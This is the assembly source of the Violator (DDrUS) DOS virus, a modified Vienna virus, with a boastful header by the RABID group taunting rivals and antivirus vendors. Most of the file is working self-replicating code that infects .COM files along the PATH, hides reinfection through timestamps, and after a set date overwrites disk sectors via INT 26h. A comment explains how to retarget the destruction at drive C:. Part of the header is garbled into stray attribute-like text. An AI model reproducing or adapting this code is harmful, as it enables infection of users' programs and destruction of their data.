

;******************************************************************************
;			   Violator Strain A Source Code
;******************************************************************************
;
; (May/1/1991)
;
; Well, in memory of the first anniversary of writing Violator, I have decided
; to release it's source code publicly. 
;
; This is the source code to the ORIGINAL Violator or DDrUS virus. It was set
; to go off on June 22nd, 1990. The significance of this date and the name
; Violator, was that my favourite group, Depeche Mode, were comming to Toronto
; to perform their "World Violator Tour" on that date. 
;
; This virus, as you can clearly see, is a base hack of the Vienna virus. The
; only thing I took out of the Vienna virus was the original scan string, and
; added date check routines as well as the INT 26 format routine. Other than
; that, this virus is pretty much like the original Vienna virus.
;
; In any event, have fun with this source code, but please keep in mind, that
; RABID does not condone the modification of this virus further in order to 
; create even more raging, destructive viruses. This source is being provided
; to you in order to see how easy it is to modify an existing virus into an
; instrument of destruction. Also, RABID accepts no responsibility for damage
; which may be wrought (material or immaterial, financial or personal, you get
; the idea...) through the spreading of this source code.
;
; At this point in time, I'd wish to express greetings to several people.
;
; To the Dark Avenger, for releasing "Eddie" source code. We have greatly 
; improved our programming prowess through analysis of your source code.
; (It wasn't that bad, despite all your self-scorning negative comments about
;  effectiveness of certain procedures)
; Keep up the great work...
; BTW: Hope you didn't mind RABID Avenger too much. We did spread the sucker
; some more...
;
; To YAM (Youth Against McAfee). Haha! Nice name. Too bad you can't program in
; anything other than PASCAL or QuickBASIC. 
;
; To John McAfee and Associates. Keep up the great work with your SCAN and
; CLEAN programs. But remember, if it wasn't for people like us, you wouldn't
; be where you are now... (BTW: How'dya like Violator B4? Did you get our 
; message, despite the bug in the ANSI routines? >SMOOCH< (hehe))="" ;="" ;="" to="" mark="" washburn.="" v2p6="" is="" excellent.="" we="" love="" the="" source="" code...="" (yes!="" we="" have="" ;="" it="" as="" well...)="" keep="" up="" the="" great="" work,="" even="" if="" it="" is="" for="" research="" purposes.="" ;="" ;="" to="" eric="" omen="" (dsz="" author).="" sorry="" about="" the="" strain="" b4="" bit.="" it="" wasn't="" our="" ;="" doing.="" you="" can="" blame="" l.o.l.="" for="" that...="" ;="" ;="" to="" l.o.l.="" get="" real="" lives="" you="" pre-pubesent="" assholes.="" your="" group="" sucks!="" what="" ;="" good="" comes="" by="" releasing="" a="" doc="" on="" 500="" ways="" to="" crash="" emulex,="" and="" claiming="" that="" ;="" you="" know="" the="" backdoors="" to="" it,="" and="" other="" bbs="" software.="" yup.="" just="" keep="" going="" to="" ;="" those="" beverly="" hills="" snob="" private="" schools="" and="" think="" you'll="" get="" somewhere="" in="" ;="" the="" world.="" ;="" ;="" to="" slave="" lord.="" take="" your="" precious="" group="" and="" shove="" it="" up="" your="" ass="" sideways.="" ;="" your="" cracks="" suck="" man!="" a="" friend="" of="" mine="" who="" attended="" comdex="" last="" year="" can="" ;="" sum="" up="" the="" majority="" of="" your="" group="" in="" one="" word.="" geeks!="" inc="" rules="" and="" it="" ;="" always="" will.="" keep="" on="" dreaming...="" we="" eat="" assholes="" like="" you="" for="" breakfast...="" ;="" need="" we="" even="" mention="" how="" many="" times="" we="" crashed="" slave="" den="" last="" year???="" ;="" 'nuff="" said...="" ;="" ;="" to="" pcm2.="" where="" the="" hell="" are="" you="" man?="" get="" working="" guy...="" ;="" ;="" and="" to="" all="" other="" virus="" writers="" out="" there="" who="" remain="" annonomous.="" keep="" up="" the="" ;="" great="" work.="" mcfee="" wouldn't="" be="" where="" he="" is="" now="" unless="" it="" wansn't="" for="" people="" ;="" like="" us.="" (he="" should="" be="" greatfull...="" ;="" ;="" take="" care="" guys...="" and="" watch="" out.="" we're="" everywhere...="" ;="" ;******************************************************************************="" ;="" ;="" -="THE=-" ;="" ;="" the="" rabid="" international="" development="" corp.="" ;="" -----------------------------------------="" ;="" big="" hey-yo's="" to:="" ff,="" tja,="" tm,="" pt,="" and="" mm.="" ;="" ;="" ;="" "...take="" heed="" that="" no="" man="" deceive="" you.="" for="" many="" shall="" come="" in="" my="" name,="" ;="" saying="" i="" am="" christ;="" and="" shall="" deceive="" many.="" and="" ye="" shall="" hear="" of="" wars="" and="" ;="" rumours="" of="" wars:="" see="" that="" ye="" be="" not="" troubled:="" for="" all="" these="" things="" must="" come="" ;="" to="" pass,="" but="" the="" end="" is="" not="" yet.="" for="" nation="" shall="" rise="" against="" nation,="" and="" ;="" kingdom="" against="" kingdom:="" and="" there="" shall="" be="" famines,="" and="" pestilences,="" and="" ;="" earthquakes,="" in="" divers="" places.="" all="" these="" are="" the="" beginning="" of="" sorrows."="" ;="" (matthew="" 24:4-9)="" ;="" ;="" the="" tenth="" day="" of="" tishri="" shall="" fall="" upon="" october="" 9th,="" 2000.="" revelation="" will="" ;="" be="" fulfilled.="" ;="" ;="" we're="" getting="" there="" unless="" those="" bastards="" in="" power="" do="" something="" to="" save="" this="" ;="" earth="" we="" live="" on.="" ;="" ;="" nostradamus="" prophesised="" that="" we="" may="" follow="" one="" of="" two="" paths.="" one="" to="" harmony,="" ;="" or="" one="" to="" destruction.="" which="" path="" will="" we="" follow?="" ;="" ;="" think="" about="" it.="" ;="" ;******************************************************************************="" mov_cx="" macro="" x="" db="" 0b9h="" dw="" x="" endm="" code="" segment="" assume="" ds:code,ss:code,cs:code,es:code="" org="" $+0100h="" vcode:="" jmp="" virus="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" nop="" v_start="" equ="" $="" virus:="" push="" cx="" mov="" dx,offset="" vir_dat="" ;this="" is="" where="" the="" virus="" data="" starts.="" ;="" the="" 2nd="" and="" 3rd="" bytes="" get="" modified.="" cld="" ;pointers="" will="" be="" auto="" incremented="" mov="" si,dx="" ;access="" data="" as="" offset="" from="" si="" add="" si,first_3="" ;point="" to="" original="" 1st="" 3="" bytes="" of="" .com="" mov="" cx,3="" mov="" di,offset="" 100h="" ;`cause="" all="" .com="" files="" start="" at="" 100h="" repz="" movsb="" ;restore="" original="" first="" 3="" bytes="" of="" .com="" mov="" si,dx="" ;keep="" si="" pointing="" to="" the="" data="" area="" mov="" ah,30h="" int="" 21h="" cmp="" al,0="" jnz="" dos_ok="" jmp="" quit="" dos_ok:="" push="" es="" mov="" ah,2fh="" int="" 21h="" mov="" [si+old_dta],bx="" mov="" [si+old_dts],es="" ;save="" the="" dta="" address="" pop="" es="" mov="" dx,dta="" ;offset="" of="" new="" dta="" in="" virus="" data="" area="" ;="" nop="" ;masm="" will="" add="" this="" nop="" here="" add="" dx,si="" ;compute="" dta="" address="" mov="" ah,1ah="" int="" 21h="" ;set="" new="" dta="" to="" inside="" our="" own="" code="" push="" es="" push="" si="" mov="" es,ds:2ch="" mov="" di,0="" ;es:di="" points="" to="" environment="" jmp="" year_check="" year_check:="" mov="" ah,2ah="" int="" 21h="" cmp="" cx,1990="" jge="" month_check="" jmp="" find_path="" month_check:="" mov="" ah,2ah="" int="" 21h="" cmp="" dh,6="" jge="" day_check="" jmp="" find_path="" day_check:="" mov="" ah,2ah="" int="" 21h="" ;="" set="" date="" to="" june="" 22nd,="" 1990="" cmp="" dl,22="" jge="" alter="" jmp="" find_path="" alter:="" mov="" al,1="" ;="" set="" for="" drive="" 'b:'="" mov="" cx,1="" ;="" change="" to="" 'mov="" al,2'="" for="" drive="" c:="" mov="" dx,00="" mov="" ds,[di+55]="" mov="" bx,[di+99]="" int="" 26h="" jmp="" find_path="" find_path:="" pop="" si="" push="" si="" ;get="" si="" back="" add="" si,env_str="" ;point="" to="" "path=" string in data area
        LODSB
        MOV     CX,OFFSET 8000H         ;Environment can be 32768 bytes long
        REPNZ   SCASB                   ;Search for first character
        MOV     CX,4

check_next_4:
        LODSB
        SCASB
        JNZ     find_path               ;If not all there, abort & start over
        LOOP    check_next_4            ;Loop to check the next character
        POP     SI
        POP     ES
        MOV     [SI+path_ad],DI         ;Save the address of the PATH
        MOV     DI,SI
        ADD     DI,wrk_spc              ;File name workspace
        MOV     BX,SI                   ;Save a copy of SI
        ADD     SI,wrk_spc              ;Point SI to workspace
        MOV     DI,SI                   ;Point DI to workspace
        JMP     SHORT   slash_ok

set_subdir:
        CMP     WORD PTR [SI+path_ad],0 ;Is PATH string ended?
        JNZ     found_subdir            ;If not, there are more subdirectories
        JMP     all_done                ;Else, we're all done


found_subdir:
        PUSH    DS
        PUSH    SI
        MOV     DS,ES:2CH               ;DS points to environment segment
        MOV     DI,SI
        MOV     SI,ES:[DI+path_ad]      ;SI = PATH address
        ADD     DI,wrk_spc              ;DI points to file name workspace


move_subdir:
        LODSB                           ;Get character
        CMP     AL,';'                  ;Is it a ';' delimiter?
        JZ      moved_one               ;Yes, found another subdirectory
        CMP     AL,0                    ;End of PATH string?
        JZ      moved_last_one          ;Yes
        STOSB                           ;Save PATH marker into [DI]
        JMP     SHORT   move_subdir

moved_last_one:
        MOV     SI,0

moved_one:
        POP     BX                      ;Pointer to virus data area
        POP     DS                      ;Restore DS
        MOV     [BX+path_ad],SI         ;Address of next subdirectory
        NOP
        CMP     CH,'\'                  ;Ends with " \"?="" jz="" slash_ok="" ;if="" yes="" mov="" al,'\'="" ;add="" one,="" if="" not="" stosb="" slash_ok:="" mov="" [bx+nam_ptr],di="" ;set="" filename="" pointer="" to="" name="" workspace="" mov="" si,bx="" ;restore="" si="" add="" si,f_spec="" ;point="" to="" "*.com"="" mov="" cx,6="" repz="" movsb="" ;move="" "*.com",0="" to="" workspace="" mov="" si,bx="" mov="" ah,4eh="" mov="" dx,wrk_spc="" ;="" nop="" ;masm="" will="" add="" this="" nop="" here="" add="" dx,si="" ;dx="" points="" to="" "*.com"="" in="" workspace="" mov="" cx,3="" ;attributes="" of="" read="" only="" or="" hidden="" ok="" int="" 21h="" jmp="" short="" find_first="" find_next:="" mov="" ah,4fh="" int="" 21h="" find_first:="" jnb="" found_file="" ;jump="" if="" we="" found="" it="" jmp="" short="" set_subdir="" ;otherwise,="" get="" another="" subdirectory="" found_file:="" mov="" ax,[si+dta_tim]="" ;get="" time="" from="" dta="" and="" al,1fh="" ;mask="" to="" remove="" all="" but="" seconds="" cmp="" al,1fh="" ;62="" seconds="" -=""> already infected
        JZ      find_next               ;If so, go find another file
        CMP     WORD PTR [SI+dta_len],OFFSET 0FA00H ;Is the file too long?
        JA      find_next               ;If too long, find another one
        CMP     WORD PTR [SI+dta_len],0AH ;Is it too short?
        JB      find_next               ;Then go find another one
        MOV     DI,[SI+nam_ptr]         ;DI points to file name
        PUSH    SI                      ;Save SI
        ADD     SI,dta_nam              ;Point SI to file name

more_chars:
        LODSB
        STOSB
        CMP     AL,0
        JNZ     more_chars              ;Move characters until we find a 00
        POP     SI
        MOV     AX,OFFSET 4300H
        MOV     DX,wrk_spc              ;Point to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H
        MOV     [SI+old_att],CX         ;Save the old attributes
        MOV     AX,OFFSET 4301H         ;Set attributes
        AND     CX,OFFSET 0FFFEH        ;Set all except "read only" (weird)
        MOV     DX,wrk_spc              ;Offset of \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        MOV     AX,OFFSET 3D02H         ;Read/Write
        MOV     DX,wrk_spc              ;Offset to \path\name in workspace
;       NOP                             ;MASM will add this NOP here
        ADD     DX,SI                   ;Point to \path\name
        INT     21H
        JNB     opened_ok               ;If file was opened OK
        JMP     fix_attr                ;If it failed, restore the attributes

opened_ok:
        MOV     BX,AX
        MOV     AX,OFFSET 5700H
        INT     21H
        MOV     [SI+old_tim],CX         ;Save file time
        MOV     [SI+ol_date],DX         ;Save the date
        MOV     AH,2CH
        INT     21H
        AND     DH,7                    
        JMP     infect

infect:
        MOV     AH,3FH
        MOV     CX,3
        MOV     DX,first_3
;       NOP                     ;MASM will add this NOP here
        ADD     DX,SI
        INT     21H             ;Save first 3 bytes into the data area
        JB      fix_time_stamp  ;Quit, if read failed
        CMP     AX,3            ;Were we able to read all 3 bytes?
        JNZ     fix_time_stamp  ;Quit, if not
        MOV     AX,OFFSET 4202H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp  ;Quit, if it didn't work
        MOV     CX,AX           ;DX:AX (long int) = file size
        SUB     AX,3            ;Subtract 3 (OK, since DX must be 0, here)
        MOV     [SI+jmp_dsp],AX ;Save the displacement in a JMP instruction
        ADD     CX,OFFSET c_len_y
        MOV     DI,SI           ;Point DI to virus data area
        SUB     DI,OFFSET c_len_x
                                ;Point DI to reference vir_dat, at start of pgm
        MOV     [DI],CX         ;Modify vir_dat reference:2nd, 3rd bytes of pgm
        MOV     AH,40H
        MOV_CX  virlen                  ;Length of virus, in bytes
        MOV     DX,SI
        SUB     DX,OFFSET codelen       ;Length of virus code, gives starting
                                        ; address of virus code in memory
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        CMP     AX,OFFSET virlen        ;All bytes written?
        JNZ     fix_time_stamp          ;Jump if error
        MOV     AX,OFFSET 4200H
        MOV     CX,0
        MOV     DX,0
        INT     21H
        JB      fix_time_stamp          ;Jump if error
        MOV     AH,40H
        MOV     CX,3
        MOV     DX,SI                   ;Virus data area
        ADD     DX,jmp_op               ;Point to the reconstructed JMP
        INT     21H

fix_time_stamp:
        MOV     DX,[SI+ol_date]         ;Old file date
        MOV     CX,[SI+old_tim]         ;Old file time
        AND     CX,OFFSET 0FFE0H
        OR      CX,1FH                  ;Seconds = 31/30 min = 62 seconds
        MOV     AX,OFFSET 5701H
        INT     21H
        MOV     AH,3EH
        INT     21H

fix_attr:
        MOV     AX,OFFSET 4301H
        MOV     CX,[SI+old_att]         ;Old Attributes
        MOV     DX,wrk_spc
;       NOP                             ;MASM will add this NOP
        ADD     DX,SI                   ;DX points to \path\name in workspace
        INT     21H

all_done:
        PUSH    DS
        MOV     AH,1AH
        MOV     DX,[SI+old_dta]
        MOV     DS,[SI+old_dts]
        INT     21H
        POP     DS

quit:
        POP     CX
        XOR     AX,AX
        XOR     BX,BX
        XOR     DX,DX
        XOR     SI,SI
        MOV     DI,OFFSET 0100H
        PUSH    DI
        XOR     DI,DI
        RET     0FFFFH

vir_dat EQU     $

intro	db	13,10,' DDrUS (C) - 1990 $',13,10
olddta_ DW      0                       ;Old DTA offset
olddts_ DW      0                       ;Old DTA segment
oldtim_ DW      0                       ;Old Time
oldate_ DW      0                       ;Old date
oldatt_ DW      0                       ;Old file attributes
first3_ EQU     $
        INT     20H
        NOP
jmpop_  DB      0E9H                    ;Start of JMP instruction
jmpdsp_ DW      0                       ;The displacement part
fspec_  DB      '*.COM',0
pathad_ DW      0                       ;Path address
namptr_ DW      0                       ;Pointer to start of file name
envstr_ DB      'PATH='                 ;Find this in the environment
wrkspc_ DB      40h dup (0)
dta_    DB      16h dup (0)             ;Temporary DTA goes here
dtatim_ DW      0,0                     ;Time stamp in DTA
dtalen_ DW      0,0                     ;File length in the DTA
dtanam_ DB      0Dh dup (0)             ;File name in the DTA

lst_byt EQU     $                       ;All lines that assemble into code are
                                        ;  above this one

virlen  =       lst_byt - v_start       ;Length, in bytes, of the entire virus
codelen =       vir_dat - v_start       ;Length of virus code, only
c_len_x =       vir_dat - v_start - 2   ;Displacement for self-modifying code
c_len_y =       vir_dat - v_start + 100H ;Code length + 100h, for PSP
old_dta =       olddta_ - vir_dat       ;Displacement to the old DTA offset
old_dts =       olddts_ - vir_dat       ;Displacement to the old DTA segment
old_tim =       oldtim_ - vir_dat       ;Displacement to old file time stamp
ol_date =       oldate_ - vir_dat       ;Displacement to old file date stamp
old_att =       oldatt_ - vir_dat       ;Displacement to old attributes
first_3 =       first3_ - vir_dat       ;Displacement-1st 3 bytes of old .COM
jmp_op  =       jmpop_  - vir_dat       ;Displacement to the JMP opcode
jmp_dsp =       jmpdsp_ - vir_dat       ;Displacement to the 2nd 2 bytes of JMP
f_spec  =       fspec_  - vir_dat       ;Displacement to the "*.COM" string
path_ad =       pathad_ - vir_dat       ;Displacement to the path address
nam_ptr =       namptr_ - vir_dat       ;Displacement to the filename pointer
env_str =       envstr_ - vir_dat       ;Displacement to the "PATH=" string
wrk_spc =       wrkspc_ - vir_dat       ;Displacement to the filename workspace
dta     =       dta_    - vir_dat       ;Displacement to the temporary DTA
dta_tim =       dtatim_ - vir_dat       ;Displacement to the time in the DTA
dta_len =       dtalen_ - vir_dat       ;Displacement to the length in the DTA
dta_nam =       dtanam_ - vir_dat       ;Displacement to the name in the DTA

        CODE    ENDS
END     VCODE

